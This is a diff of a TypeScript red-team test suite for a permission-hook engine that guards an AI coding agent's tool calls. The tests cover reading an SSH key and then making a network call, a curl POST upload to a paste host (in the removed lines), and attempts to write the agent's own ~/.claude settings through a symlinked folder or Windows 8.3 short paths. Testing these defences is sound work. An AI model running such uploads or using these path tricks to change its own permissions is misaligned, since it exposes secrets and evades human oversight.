@@ -1,3 +1,4 @@
+import { spawnSync } from "node:child_process";
 import fs from "node:fs";
 import path from "node:path";
 import { fileURLToPath } from "node:url";
@@ -8,6 +9,15 @@ import { runHook, type HookEventArg } from "../src/index.js";
 import { allFiles, bash, common, makeEnv, post, pre, spooled, toolUseId } from "./helpers.js";
 
 const run = (env: ReturnType<typeof makeEnv>, event: HookEventArg, payload: unknown) => runHook(event, JSON.stringify(payload), env);
+
+/** The 8.3 short form of a Windows path (via cmd's %~s), or null if it can't be read. */
+function shortName(p: string): string | null {
+  // Verbatim arguments: otherwise Node escapes the quotes and cmd echoes a garbled path.
+  const r = spawnSync("cmd.exe", ["/d", "/c", `for %I in ("${p}") do @echo %~sI`], { encoding: "utf8", windowsHide: true, windowsVerbatimArguments: true });
+  const out = r.status === 0 ? r.stdout.trim() : "";
+  // Accept only a real short alias of the same folder.
+  return out.length > 0 && !out.includes("\"") && fs.existsSync(out) && fs.realpathSync.native(out).toLowerCase() === fs.realpathSync.native(p).toLowerCase() ? out : null;
+}
 const decisionOf = (stdout: string) => (stdout ? (JSON.parse(stdout) as { hookSpecificOutput?: { permissionDecision?: string; permissionDecisionReason?: string } }).hookSpecificOutput : undefined);
 const posts = (env: ReturnType<typeof makeEnv>) => spooled(env).filter((e) => e.kind === "tool_post");
 
@@ -231,16 +241,57 @@ describe("fail rules and red team", () => {
     expect(({} as Record<string, unknown>)["x"]).toBeUndefined();
   });
 
-  it("RT-HOOK-16: a sensitive read taints the session; a later network upload is stricter", () => {
+  // Corrected 2026-11-25: the first version asserted that a sensitive read alone makes a later
+  // upload ask. The engine's locked rule (Q1, CP-FLOW-003) escalates network calls only after
+  // untrusted content AND a secret/sensitive read; the test passed on Windows only because of a
+  // separate engine bug (project uploads seen as "outside" there). The intent is unchanged:
+  // signals stored by earlier hook processes make a later process's decision stricter.
+  it("RT-HOOK-16: untrusted web content + a sensitive read, in earlier hook calls, make a later network call ask", () => {
     const env = makeEnv();
+    const plain = run(env, "pre", pre(env, "Bash", bash("curl https://api.example.com/ping")));
+    expect(decisionOf(plain.stdout)?.permissionDecision).toBeUndefined(); // baseline: no decision
+
+    const fetchId = toolUseId();
+    run(env, "pre", pre(env, "WebFetch", { url: "https://example.com/page", prompt: "summarize" }, fetchId));
+    run(env, "post", post(env, "WebFetch", { url: "https://example.com/page", prompt: "summarize" }, fetchId, "page text"));
     fs.mkdirSync(path.join(env.homeDir, ".ssh"), { recursive: true });
     const key = path.join(env.homeDir, ".ssh", "id_rsa");
     fs.writeFileSync(key, "x");
-    const id = toolUseId();
-    run(env, "pre", pre(env, "Read", { file_path: key }, id));
-    run(env, "post", post(env, "Read", { file_path: key }, id, { type: "text", file: { filePath: key, content: "x" } }));
-    const r = run(env, "pre", pre(env, "Bash", bash("curl -X POST -d @notes.txt https://paste.example.com")));
-    expect(["ask", "deny"]).toContain(decisionOf(r.stdout)?.permissionDecision);
+    const readId = toolUseId();
+    run(env, "pre", pre(env, "Read", { file_path: key }, readId));
+    run(env, "post", post(env, "Read", { file_path: key }, readId, { type: "text", file: { filePath: key, content: "x" } }));
+
+    const r = run(env, "pre", pre(env, "Bash", bash("curl https://api.example.com/ping")));
+    expect(decisionOf(r.stdout)?.permissionDecision).toBe("ask");
+  });
+
+  it("RT-HOOK-22: a project folder that is really a link into ~/.claude is seen as ~/.claude", () => {
+    const env = makeEnv();
+    const claude = path.join(env.homeDir, ".claude");
+    fs.mkdirSync(claude, { recursive: true });
+    const link = path.join(env.root, "innocent-project");
+    fs.symlinkSync(claude, link, process.platform === "win32" ? "junction" : "dir");
+    const r = runHook("pre", JSON.stringify({ ...pre(env, "Bash", bash("echo {} > settings.local.json")), cwd: link }), env);
+    expect(decisionOf(r.stdout)?.permissionDecision).toBe("deny");
+  });
+
+  it.runIf(process.platform === "win32")("RT-HOOK-23: an 8.3 short-name working folder doesn't cause false denials (Windows)", () => {
+    // As on CI runners (temp folder C:\Users\RUNNER~1\...): the home folder AND the working folder
+    // arrive in short form. Without expanding the working folder, the engine denies `mkdir out`.
+    const base = makeEnv();
+    const short = shortName(base.project);
+    if (short === null || !short.includes("~")) {
+      // 8.3 names are disabled on this volume; CI runners have them.
+      console.warn("RT-HOOK-23: no 8.3 short name available on this volume; not exercised here");
+      return;
+    }
+    const shortHome = path.dirname(short);
+    const env = { ...base, homeDir: shortHome, glassboxHome: path.join(shortHome, ".glassbox") };
+    const r = runHook("pre", JSON.stringify({ ...pre(env, "Bash", bash("mkdir out")), cwd: short }), env);
+    expect(r.stdout).toBe("");
+    // Protection still holds through the short spellings.
+    const w = runHook("pre", JSON.stringify({ ...pre(env, "Write", { file_path: path.join(shortHome, ".claude", "settings.json"), content: "{}" }), cwd: short }), env);
+    expect(decisionOf(w.stdout)?.permissionDecision).toBe("deny");
   });
 });
 
